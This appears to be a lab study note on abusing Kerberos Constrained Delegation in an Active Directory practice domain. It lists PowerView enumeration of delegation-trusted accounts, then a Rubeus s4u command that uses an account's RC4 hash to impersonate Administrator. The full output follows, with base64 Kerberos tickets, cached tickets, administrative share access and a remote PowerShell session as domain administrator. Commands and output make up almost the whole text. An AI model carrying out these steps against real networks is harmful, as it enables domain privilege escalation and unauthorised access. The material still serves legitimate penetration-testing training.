#### Theory can be found in [[2. Domain Privilege Escalation#4. KCD]] ####

- Find accounts (users or computers) with Constrained Delegation privileges.
```
PS C:\AD\MyTools> Get-DomainComputer -TrustedToAuth | select samaccountname,msds-allowedtodelegateto

samaccountname  msds-allowedtodelegateto
--------------  ------------------------
DCORP-ADMINSRV$ {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}


PS C:\AD\MyTools> Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto

samaccountname msds-allowedtodelegateto
-------------- ------------------------
websvc         {CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL, CIFS/dcorp-mssql}
```

- Exploit the KCD.
```
PS C:\AD\MyTools> .\Rubeus.exe s4u /nowrap /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /impersonateuser:Administrator /domain:dollarcorp.moneycorp.local /user:websvc /rc4:CC098F204C5887EAA8253E7C2749156F /altservice:http,host,ldap,cifs /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: S4U

[*] Using rc4_hmac hash: CC098F204C5887EAA8253E7C2749156F
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\websvc'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFwjCCBb6gAwIBBaEDAgEWooIErzCCBKthggSnMIIEo6ADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOCBEswggRHoAMCARKhAwIBAqKCBDkEggQ1M8pRwx1jOwqc5LKyaWRqJ6Prii2lyFpu6Prc2i43HBHYE/X1Y0XD5wF16FylQjIH7iCfOy64h9R33QgSsOMcajPchSWovHbtv+D3qjRfIWCxbHHTLnarH11ogc0rxkSHU/Ag/C57L4daHnu4+WdIQLRtW9XQ6z8hYt/LNDQsN2+Mwo1by+r6GD9jRTFKJgpYLpLVz5VrNkch7Mku7f+2jpZf1lLaAue0hwxDmTeYmBUqXK1eTbKfiQsADq7GpBTvLPW6FeF3KBYWnadGdO3VshH12pQZYL+bRuiZ+QVXA05d4Pc6ljzRuTU2QIVS5OsESDXEh91c9Nvq2Lp3z2qxL2Cr+KfYF5+WCGBVMFsu5oARcmDNBEsPbT9CrhXkoyJ1mEbD4HNipcraLPzSyG5kqPf1+wBmbVE8bivVhgevZMgJK3QU+NVqpOEQ0OPi+j5fiE34GQS6CDah6/fgebeVcIG5MfGF6tWiKQCaPTz2lcnU2aXFjlK/K8XU9no3j1BPhjhebISa5TrkIkGjkntemKosTZScnOkjWEp1x5xeq1YztChpP8hSWZGpM6BXoumJZk41pQMWPaqDzpUs8QaOkIMrPSYHwpHUQYRS4elquCFa+ZFI8tR9Z4UGM/HqWYuRn5B9KGOs7VFkL12a7hzYGfV3uyIYr9aivXEoIblXkIDIdpXdwBvaCC4/j1b67odppefpsIzHEIH2JOD7ahunh6cCl0GV4Ge9RAGhwAtOn4OoCLBSo2ZtqExuSc+0c3OkSKix4JnUrJGiqllGKO9Ujqwy4atZ4c6DbFqVMxStzpBqEVWCwPeK+OS6I7PyjynjfgP3lAwr00ScMgj0n/LqCzJ58qyrWcbm1SU7ob3DlHoeDHa2LhNrNDoXHqgv9taE7a+xp+JsNLWP4KixVCyzzeddYHQd1Xp19ThA3ZlW1wwLAfFUEpwpuKVWkCQ4GlULb1L6o9HeF04KNacsImSbgrhdq/st3tAsMyMC1QnV4yuH+0BDaxbTDv5dPZi76kw4FwZ6QmO++CCt5Y+tI+UpnUF2XpmnyKsyK6OwwO3ifVGIhXB+gkdFDuhQrUdJ37klybE0QUc2HWAafQXBYes3Skv7/iSqjpo8qDOyg56Ep2wI2JSw8uZB3bdVse3qavlg40DJuGQ4ESrAQKlPERuwbHQvh8P9LJeVESEHB2JYgUrTXg4sLzGGsUzQLor1fGMhc4HHqqSrKgKsbY8Eb9IdnLvypwU7bSY2XCH1wex/q/C26L3YhctrTGKy/vjCUgSpxKOgBF/dpOq/fbtQFiO1NFKD9mvY/4oHZDohFgdbvfqs3rvonmG7gyQUcNAJArlMxPvtHa0MWdyZgRmTj5/i5xloJOAaLyhf3S6G/2scXWYQ9JJOnqFYemcXqWHPBp9NlEoia3zgNLgOEIqyk+yQ2HwFgmOCo4H+MIH7oAMCAQCigfMEgfB9ge0wgeqggecwgeQwgeGgGzAZoAMCARehEgQQKgWKzqzIfGUrmHYo/I80pqEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKITMBGgAwIBAaEKMAgbBndlYnN2Y6MHAwUAQOEAAKURGA8yMDIzMDgxMDA4NDgxM1qmERgPMjAyMzA4MTAxODQ4MTNapxEYDzIwMjMwODE3MDg0ODEzWqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEmMCQbBmtyYnRndBsaZG9sbGFyY29ycC5tb25leWNvcnAubG9jYWw=


[*] Action: S4U

[*] Building S4U2self request for: 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
[*] base64(ticket.kirbi):

      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

[*] Impersonating user 'Administrator' to target SPN 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL'
[*]   Final tickets will be for the alternate services 'http,host,ldap,cifs'
[*] Building S4U2proxy request for service: 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'http'
[*] base64(ticket.kirbi) for SPN 'http/dcorp-mssql.dollarcorp.moneycorp.LOCAL':

<snip>

PS C:\AD\MyTools> klist

Current LogonId is 0:0x500f4dc

Cached Tickets: (4)

#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 8/10/2023 1:48:13 (local)
        End Time:   8/10/2023 11:48:13 (local)
        Renew Time: 8/17/2023 1:48:13 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

#1>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: ldap/dcorp-mssql.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 8/10/2023 1:48:13 (local)
        End Time:   8/10/2023 11:48:13 (local)
        Renew Time: 8/17/2023 1:48:13 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

#2>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: host/dcorp-mssql.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 8/10/2023 1:48:13 (local)
        End Time:   8/10/2023 11:48:13 (local)
        Renew Time: 8/17/2023 1:48:13 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

#3>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: http/dcorp-mssql.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 8/10/2023 1:48:13 (local)
        End Time:   8/10/2023 11:48:13 (local)
        Renew Time: 8/17/2023 1:48:13 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

PS C:\AD\MyTools> dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$


    Directory: \\dcorp-mssql.dollarcorp.moneycorp.local\c$


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:15 AM                PerfLogs
d-r---        11/14/2022   4:44 AM                Program Files
d-----        11/14/2022   4:43 AM                Program Files (x86)
d-----        11/15/2022   8:06 AM                Transcripts
d-r---        11/15/2022   1:48 AM                Users
d-----        11/11/2022   5:22 AM                Windows
d-----        11/11/2022   5:22 AM                Windows


PS C:\AD\MyTools> Enter-PSSession -ComputerName dcorp-mssql.dollarcorp.moneycorp.local
[dcorp-mssql.dollarcorp.moneycorp.local]: PS C:\Users\Administrator.dcorp\Documents> hostname
dcorp-mssql
[dcorp-mssql.dollarcorp.moneycorp.local]: PS C:\Users\Administrator.dcorp\Documents> whoami
dcorp\administrator
```

